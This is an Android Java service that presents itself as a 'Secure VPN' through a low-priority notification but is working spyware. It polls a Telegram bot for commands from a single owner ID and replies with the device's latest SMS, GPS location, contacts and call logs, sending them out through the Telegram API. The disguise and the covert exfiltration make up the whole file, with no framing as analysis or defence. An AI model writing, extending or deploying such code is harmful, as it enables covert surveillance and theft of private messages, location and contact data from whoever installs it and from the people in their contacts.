package com.security.vpn;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class TelegramService extends Service {
    private static final String TAG = "TelegramService";
    private final OkHttpClient client = new OkHttpClient();
    private int lastUpdateId = 0;
    private boolean isRunning = true;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, "VPN_SERVICE")
                .setContentTitle("Secure VPN")
                .setContentText("VPN is running...")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        
        startForeground(1, notification);

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        pollTelegram();
                        Thread.sleep(3000);
                    } catch (Exception e) {
                        Log.e(TAG, "Loop error: " + e.getMessage());
                    }
                }
            }
        }).start();

        return START_STICKY;
    }

    private void pollTelegram() {
        String url = Config.TELEGRAM_API + "getUpdates?offset=" + (lastUpdateId + 1);
        Request request = new Request.Builder().url(url).build();

        try (Response response = client.newCall(request).execute()) {
            if (response.isSuccessful() && response.body() != null) {
                String jsonData = response.body().string();
                JSONObject jsonObject = new JSONObject(jsonData);
                JSONArray updates = jsonObject.getJSONArray("result");

                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        String chatId = String.valueOf(message.getJSONObject("chat").getLong("id"));

                        if (chatId.equals(Config.OWNER_ID)) {
                            handleCommand(text, chatId);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Polling failed: " + e.getMessage());
        }
    }

    private void handleCommand(String command, String chatId) {
        if (command.startsWith("/start")) {
            String deviceInfo = "Device: " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
            sendMessage(chatId, "Welcome Owner!\n" + deviceInfo + "\n\nMenu:\n/sms - Get Latest SMS\n/location - Get GPS\n/contacts - Get Contacts\n/calllog - Get Call Logs");
        } else if (command.equals("/sms")) {
            sendMessage(chatId, "Latest SMS:\n" + getLatestSMS());
        } else if (command.equals("/location")) {
            sendMessage(chatId, "Current Location:\n" + getLocation());
        } else if (command.equals("/contacts")) {
            sendMessage(chatId, "Contacts (Top 10):\n" + getContacts());
        } else if (command.equals("/calllog")) {
            sendMessage(chatId, "Call Logs (Top 5):\n" + getCallLogs());
        } else {
            sendMessage(chatId, "Unknown command: " + command);
        }
    }

    private String getLatestSMS() {
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                cursor.close();
                return "From: " + address + "\nMsg: " + body;
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
        return "No SMS found.";
    }

    private String getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = null;
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (loc != null) {
                return "Lat: " + loc.getLatitude() + "\nLon: " + loc.getLongitude() + "\nMaps: https://www.google.com/maps?q=" + loc.getLatitude() + "," + loc.getLongitude();
            }
        } catch (SecurityException e) {
            return "Permission denied.";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
        return "Location not available.";
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            int count = 0;
            if (cursor != null) {
                while (cursor.moveToNext() && count < 10) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
        return sb.length() > 0 ? sb.toString() : "No contacts found.";
    }

    private String getCallLogs() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 5");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    sb.append("Num: ").append(number).append("\nType: ").append(type).append("\nDur: ").append(duration).append("s\n\n");
                }
                cursor.close();
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
        return sb.length() > 0 ? sb.toString() : "No call logs found.";
    }

    private void sendMessage(String chatId, String text) {
        try {
            String encodedText = URLEncoder.encode(text, "UTF-8");
            String url = Config.TELEGRAM_API + "sendMessage?chat_id=" + chatId + "&text=" + encodedText;
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Send failed: " + e.getMessage());
                }
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Encoding failed: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "VPN_SERVICE",
                    "VPN Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
